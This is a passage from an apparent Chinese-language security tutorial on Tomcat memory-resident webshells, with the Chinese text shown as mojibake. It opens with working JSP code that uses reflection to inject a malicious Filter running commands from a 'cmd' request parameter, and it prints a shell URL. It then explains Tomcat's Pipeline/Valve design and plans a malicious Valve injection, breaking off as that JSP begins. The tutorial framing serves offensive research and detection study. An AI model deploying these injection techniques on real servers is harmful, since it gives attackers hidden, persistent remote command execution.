<span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.getWriter().println(output);</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(filterName);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">        filterConfigs.put(filterName, applicationFilterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Malicious filter injection successful!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Filter name: &quot;</span> + filterName + <span class="string">&quot;&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Below is a list displaying filter names and their corresponding URL patterns:&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;tr&gt;&lt;th&gt;Filter Name&lt;/th&gt;&lt;th&gt;URL Patterns&lt;/th&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">        List&lt;String[]&gt; allUrlPatterns = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Object filterConfigObj : filterConfigs.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (filterConfigObj <span class="keyword">instanceof</span> ApplicationFilterConfig) &#123;</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) filterConfigObj;</span><br><span class="line">                <span class="type">String</span> <span class="variable">filtername</span> <span class="operator">=</span> filterConfig.getFilterName();</span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterdef</span> <span class="operator">=</span> standardContext.findFilterDef(filtername);</span><br><span class="line">                <span class="keyword">if</span> (filterdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                    FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line">                    <span class="keyword">for</span> (FilterMap filtermap : filterMaps) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (filtermap.getFilterName().equals(filtername)) &#123;</span><br><span class="line">                            String[] urlPatterns = filtermap.getURLPatterns();</span><br><span class="line">                            allUrlPatterns.add(urlPatterns);</span><br><span class="line">                            out.println(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + filtername + <span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                            out.println(<span class="string">&quot;&lt;td&gt;&quot;</span> + String.join(<span class="string">&quot;, &quot;</span>, urlPatterns) + <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/table&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String[] urlPatterns : allUrlPatterns) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String pattern : urlPatterns) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!pattern.equals(<span class="string">&quot;/*&quot;</span>)) &#123;</span><br><span class="line">                    out.println(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;shell: http://localhost:8080/test&quot;</span> + pattern + <span class="string">&quot;?cmd=whoami&lt;br&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">characters</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">randomString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * characters.length());</span><br><span class="line">            randomString.append(characters.charAt(index));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> randomString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907162200007.png" alt="image-20250907162200007"></p><h2 id="Tomcat-Valve-å®¹å™¨å†…éƒ¨ç»„ä»¶"><a href="#Tomcat-Valve-å®¹å™¨å†…éƒ¨ç»„ä»¶" class="headerlink" title="Tomcat Valve å®¹å™¨å†…éƒ¨ç»„ä»¶"></a>Tomcat Valve å®¹å™¨å†…éƒ¨ç»„ä»¶</h2><p>è¿™é‡Œæˆ‘ç»„åˆå¼•ç”¨åŸæ–‡ï¼Œåšäº†é€‚å½“çš„ä¿®æ”¹ï¼Œæ¦‚æ‹¬ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tomcatä¸­çš„Containeræœ‰4ç§ï¼Œåˆ†åˆ«æ˜¯Engineã€Hostã€Contextå’ŒWrapperï¼Œè¿™4ä¸ªContainerçš„å®ç°ç±»åˆ†åˆ«æ˜¯`StandardEngine`ã€`StandardHost`ã€`StandardContext`å’Œ`StandardWrapper`ã€‚4ç§å®¹å™¨çš„å…³ç³»æ˜¯åŒ…å«å…³ç³»ï¼ŒEngineåŒ…å«Hostï¼ŒHoståŒ…å«Contextï¼ŒContextåŒ…å«Wrapperï¼ŒWrapperåˆ™ä»£è¡¨æœ€åŸºç¡€çš„ä¸€ä¸ªServletã€‚ tomcatç”±Connectorå’ŒContainerä¸¤éƒ¨åˆ†ç»„æˆï¼Œè€Œå½“ç½‘ç»œè¯·æ±‚è¿‡æ¥çš„æ—¶å€™Connectorå…ˆå°†è¯·æ±‚åŒ…è£…ä¸ºRequestï¼Œç„¶åå°†Requestäº¤ç”±Containerè¿›è¡Œå¤„ç†ï¼Œæœ€ç»ˆè¿”å›ç»™è¯·æ±‚æ–¹ã€‚è€ŒContainerå¤„ç†çš„ç¬¬ä¸€å±‚å°±æ˜¯Engineå®¹å™¨ï¼Œä½†æ˜¯åœ¨tomcatä¸­Engineå®¹å™¨ä¸ä¼šç›´æ¥è°ƒç”¨Hostå®¹å™¨å»å¤„ç†è¯·æ±‚ï¼Œé‚£ä¹ˆè¯·æ±‚æ˜¯æ€ä¹ˆåœ¨4ä¸ªå®¹å™¨ä¸­æµè½¬çš„ï¼Œ4ä¸ªå®¹å™¨ä¹‹é—´æ˜¯æ€ä¹ˆä¾æ¬¡è°ƒç”¨çš„å‘¢ï¼Ÿ</span><br><span class="line"></span><br><span class="line">åŸæ¥ï¼Œå½“è¯·æ±‚åˆ°è¾¾Engineå®¹å™¨çš„æ—¶å€™ï¼ŒEngineå¹¶éæ˜¯ç›´æ¥è°ƒç”¨å¯¹åº”çš„Hostå»å¤„ç†ç›¸å…³çš„è¯·æ±‚ï¼Œè€Œæ˜¯è°ƒç”¨äº†è‡ªå·±çš„ä¸€ä¸ªç»„ä»¶å»å¤„ç†ï¼Œè¿™ä¸ªç»„ä»¶å°±å«åšpipelineç»„ä»¶ï¼Œè·Ÿpipelineç›¸å…³çš„è¿˜æœ‰ä¸ªä¹Ÿæ˜¯å®¹å™¨å†…éƒ¨çš„ç»„ä»¶ï¼Œå«åš`valve`ç»„ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">Pipelineçš„ä½œç”¨å°±å¦‚å…¶ä¸­æ–‡æ„æ€ä¸€æ ·â€”â€”ç®¡é“ï¼Œå¯ä»¥æŠŠä¸åŒå®¹å™¨æƒ³è±¡æˆä¸€ä¸ªç‹¬ç«‹çš„ä¸ªä½“ï¼Œé‚£ä¹ˆpipelineå°±å¯ä»¥ç†è§£ä¸ºä¸åŒå®¹å™¨ä¹‹é—´çš„ç®¡é“ï¼Œé“è·¯ï¼Œæ¡¥æ¢ã€‚é‚£Valveè¿™ä¸ªç»„ä»¶æ˜¯ä»€ä¹ˆä¸œè¥¿å‘¢ï¼ŸValveä¹Ÿå¯ä»¥ç›´æ¥æŒ‰ç…§å­—é¢æ„æ€å»ç†è§£ä¸ºé˜€é—¨ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ç”Ÿæ´»ä¸­å¯ä»¥çœ‹åˆ°æ¯ä¸ªç®¡é“ä¸Šé¢éƒ½æœ‰é˜€é—¨ï¼ŒPipelineå’ŒValveå…³ç³»ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚Valveä»£è¡¨ç®¡é“ä¸Šçš„é˜€é—¨ï¼Œå¯ä»¥æ§åˆ¶ç®¡é“çš„æµå‘ï¼Œå½“ç„¶æ¯ä¸ªç®¡é“ä¸Šå¯ä»¥æœ‰å¤šä¸ªé˜€é—¨ã€‚å¦‚æœæŠŠPipelineæ¯”ä½œå…¬è·¯çš„è¯ï¼Œé‚£ä¹ˆValveå¯ä»¥ç†è§£ä¸ºå…¬è·¯ä¸Šçš„æ”¶è´¹ç«™ï¼Œè½¦ä»£è¡¨Pipelineä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆæ¯ä¸ªæ”¶è´¹ç«™éƒ½ä¼šå¯¹å…¶ä¸­çš„å†…å®¹åšä¸€äº›å¤„ç†ï¼ˆæ”¶è´¹ï¼ŒæŸ¥è¯ä»¶ç­‰ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">åœ¨Catalinaä¸­ï¼Œ4ç§å®¹å™¨éƒ½æœ‰è‡ªå·±çš„Pipelineç»„ä»¶ï¼Œæ¯ä¸ªPipelineç»„ä»¶ä¸Šè‡³å°‘ä¼šè®¾å®šä¸€ä¸ªValveï¼Œè¿™ä¸ªValveæˆ‘ä»¬ç§°ä¹‹ä¸ºBaseValveï¼Œä¹Ÿå°±æ˜¯åŸºç¡€é˜€ã€‚åŸºç¡€é˜€çš„ä½œç”¨æ˜¯è¿æ¥å½“å‰å®¹å™¨çš„ä¸‹ä¸€ä¸ªå®¹å™¨ï¼ˆé€šå¸¸æ˜¯è‡ªå·±çš„è‡ªå®¹å™¨ï¼‰ï¼Œå¯ä»¥è¯´åŸºç¡€é˜€æ˜¯ä¸¤ä¸ªå®¹å™¨ä¹‹é—´çš„æ¡¥æ¢ã€‚</span><br><span class="line">Pipelineå®šä¹‰å¯¹åº”çš„æ¥å£Pipelineï¼Œæ ‡å‡†å®ç°äº†StandardPipelineã€‚Valveå®šä¹‰å¯¹åº”çš„æ¥å£Valveï¼ŒæŠ½è±¡å®ç°ç±»ValveBaseï¼Œ4ä¸ªå®¹å™¨å¯¹åº”åŸºç¡€é˜€é—¨åˆ†åˆ«æ˜¯StandardEngineValveï¼ŒStandardHostValveï¼ŒStandardContextValveï¼ŒStandardWrapperValveã€‚åœ¨å®é™…è¿è¡Œä¸­ï¼ŒPipelineå’ŒValveè¿è¡Œæœºåˆ¶å¦‚ä¸‹å›¾ï¼š</span><br><span class="line"></span><br><span class="line">è¿™å¼ å›¾æ˜¯æ–°åŠ å¡çš„Dennis Jacobåœ¨ApacheCON Asia 2022ä¸Šçš„æ¼”è®²ã€ŠExtending Valves in Tomcatã€‹ä¸­çš„PPTä¸­çš„å›¾ç‰‡ï¼Œè¿™ç¯‡æ¼”è®²çš„å½•å±åœ¨[Youtube](https://www.youtube.com/watch?v=Jmw-d0kyZ_4)ä¸Šé¢å¯ä»¥æ‰¾åˆ°ã€‚</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250624155947-32819458-50d1-1.png" alt="img"></p><h2 id="ç¼–å†™ä¸€ä¸ªç®€å•-Tomcat-Valve-çš„-demo"><a href="#ç¼–å†™ä¸€ä¸ªç®€å•-Tomcat-Valve-çš„-demo" class="headerlink" title="ç¼–å†™ä¸€ä¸ªç®€å• Tomcat Valve çš„ demo"></a>ç¼–å†™ä¸€ä¸ªç®€å• Tomcat Valve çš„ demo</h2><ol><li>ç›´æ¥åˆ›å»ºSpringçš„é¡¹ç›®</li><li>ç„¶ååˆ›å»ºtestç›®å½•å¹¶åœ¨testç›®å½•ä¸‹åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼ŒTestValve.javaï¼š</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Valve è¢«æˆåŠŸè°ƒç”¨&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>è¿˜æœ‰TestConfig.java</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.Valve;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.server.WebServerFactoryCustomizer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> WebServerFactoryCustomizer&lt;TomcatServletWebServerFactory&gt; <span class="title function_">tomcatCustomizer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> factory -&gt; &#123;</span><br><span class="line">            factory.addContextValves(getTestValve());</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getTestValve</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TestValve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907221429315.png" alt="image-20250907221429315"></p><h2 id="Tomcat-Valve-æ‰“å…¥å†…å­˜é©¬æ€è·¯åˆ†æ"><a href="#Tomcat-Valve-æ‰“å…¥å†…å­˜é©¬æ€è·¯åˆ†æ" class="headerlink" title="Tomcat Valve æ‰“å…¥å†…å­˜é©¬æ€è·¯åˆ†æ"></a>Tomcat Valve æ‰“å…¥å†…å­˜é©¬æ€è·¯åˆ†æ</h2><p>æˆ‘ä»¬é€šå¸¸æƒ…å†µä¸‹ç”¨çš„éƒ½æ˜¯ValveBaseï¼Œä»com.example.tomcatvalvedemo.TomcatDemo.TestValveè¿›è¿™ä¸ªValveBaseï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å®ç°äº†Valveæ¥å£ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907221619250.png" alt="image-20250907221619250"></p><p>ç‚¹è¿›valveå¯ä»¥çœ‹åˆ°è¯¥æ¥å£ä»£ç å¦‚ä¸‹ï¼Œè¿™é‡Œæˆ‘åŠ ä¸Šäº†æ³¨é‡Šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line">    <span class="comment">// è·å–ä¸‹ä¸€ä¸ªé˜€é—¨</span></span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getNext</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">// è®¾ç½®ä¸‹ä¸€ä¸ªé˜€é—¨</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span>;</span><br><span class="line">    <span class="comment">// åå°æ‰§è¡Œé€»è¾‘ï¼Œä¸»è¦åœ¨ç±»åŠ è½½ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨åˆ°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">// æ‰§è¡Œä¸šåŠ¡é€»è¾‘</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line">    <span class="comment">// æ˜¯å¦å¼‚æ­¥æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹å‘å·¦ä¸‹è§’ï¼Œçœ‹çœ‹ä¹‹å‰è°ƒç”¨åˆ°çš„<code>invoke</code>æ–¹æ³•ï¼š</p><p>åœ¨<code>StandardHostValve.java</code>ä¸­ï¼Œä»£ç ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907221938103.png" alt="image-20250907221938103"></p><p>åœ¨<code>StandardEngineValve.java</code>ä¸­ï¼Œä»£ç ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host.getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907222043754.png" alt="image-20250907222043754"></p><p>ä¹‹åçš„è¯¸å¦‚<code>Http11Processor.java</code>å’Œå¤šçº¿ç¨‹çš„éƒ¨åˆ†å°±ä¸éœ€è¦æˆ‘ä»¬å…³æ³¨äº†ã€‚æ—¢ç„¶æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰“å…¥å†…å­˜é©¬ï¼Œé‚£æ ¹æ®æˆ‘ä»¬æŒæ¡çš„<code>Tomcat Servlet/Filter/Listener</code>å†…å­˜é©¬çš„æ€è·¯æ¥çœ‹ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æŸç§æ–¹å¼æ·»åŠ æˆ‘ä»¬è‡ªå·±çš„æ¶æ„<code>valve</code>ã€‚</p><p>æˆ‘ä»¬å»æ‰ä¹‹å‰æ‰“çš„æ–­ç‚¹ï¼Œåœ¨<code>StandardHostValve.java</code>è¿™é‡Œæ‰“ä¸Šæ–­ç”µå¹¶é‡æ–°è°ƒè¯•ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130154855309.png" alt="img"></p><p>ç„¶å<code>step into</code>ï¼š</p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130154950328.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130154950328.png" alt="img"></a></p><p>é¼ æ ‡å·¦é”®å•å‡»è¿™é‡Œçš„<code>getPipeline</code>å³å¯è¿›å…¥åˆ°æ‰€è°ƒç”¨çš„å‡½æ•°å®ç°çš„ä½ç½®ï¼š</p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155044025.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130155044025.png" alt="img"></a></p><p>å†<code>Ctrl+H</code>è¿›å…¥<code>Pipeline</code>æ¥å£ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æœ‰ä¸ª<code>addValve</code>æ–¹æ³•ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907225309496.png" alt="image-20250907225309496"></p><p>è¿™ä¸æ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„å—ï¼Ÿæˆ‘ä»¬å»çœ‹çœ‹å®ƒæ˜¯åœ¨å“ªå„¿å®ç°çš„ï¼Œç›´æ¥åœ¨<code>addValve</code>å‡½æ•°å¤„<code>Ctrl+H</code>æ‰¾ç»§æ‰¿è¯¥æ¥å£çš„ç±»ï¼Œå¯å¯ä»¥çœ‹åˆ°æ˜¯åœ¨<code>org.apache.catalina.core.StandardPipeline</code>ä¸­ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907225426956.png" alt="image-20250907225426956"></p><p>ä½†æ˜¯é—®é¢˜å°±æ¥äº†ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥è·å–åˆ°è¿™ä¸ª<code>StandardPipeline</code>ï¼Œè€Œæˆ‘ä»¬èƒ½ç›´æ¥è·å–åˆ°çš„æ˜¯<code>StandardContext</code>ï¼Œé‚£å°±å»çœ‹çœ‹<code>StandardContext.java</code>ä¸­æœ‰æ²¡æœ‰è·å–<code>StandardPipeline</code>çš„æ–¹æ³•ã€‚</p><p>ä¸€çœ¼å°±èƒ½çœ‹åˆ°æˆ‘ä»¬çš„è€ç†Ÿäººâ€”â€”<code>getPipeline</code>æ–¹æ³•ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130155825670.png" alt="img"></p><p>é‚£è¿™æ ·ä»¥æ¥æˆ‘ä»¬çš„æ€è·¯å°±å¯ä»¥è¡¥å……å®Œæ•´äº†ï¼Œå…ˆåå°„è·å–<code>StandardContext</code>ï¼Œç„¶åç¼–å†™ä¸€ä¸ªæ¶æ„<code>Valve</code>ï¼Œæœ€åé€šè¿‡<code>StandardContext.getPipeline().addValve()</code>æ·»åŠ å°±å¯ä»¥äº†ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åå°„è·å–<code>StandardPipeline</code>ï¼Œç„¶åå†<code>addValve</code>ï¼Œè¿™æ ·ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><h2 id="Tomcat-Valveå‹å†…å­˜é©¬å®ç°"><a href="#Tomcat-Valveå‹å†…å­˜é©¬å®ç°" class="headerlink" title="Tomcat Valveå‹å†…å­˜é©¬å®ç°"></a>Tomcat Valveå‹å†…å­˜é©¬å®ç°</h2><p>æˆ‘è¿™é‡Œæ˜¯æ–°å»ºäº†ä¸€ä¸ªé¡¹ç›®ï¼Œå¹¶åˆ›å»ºé…ç½®å¥½äº†<code>web</code>ç›®å½•å’Œ<code>tomcat</code>ç¯å¢ƒï¼Œ<code>pom.xml</code>ä¸­çš„ä¾èµ–å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;9.0.83&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœideaå¯åŠ¨tomcatæŠ¥é”™ï¼Œå¯ä»¥çœ‹çœ‹æ˜¯ä¸æ˜¯ä½ å¼€äº†ç½‘æ˜“äº‘å“ˆå“ˆå“ˆï¼š</p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130181221187.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130181221187.png" alt="img"></a></p></blockquote><p>åœ¨<code>web</code>ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª<code>666.jsp</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> 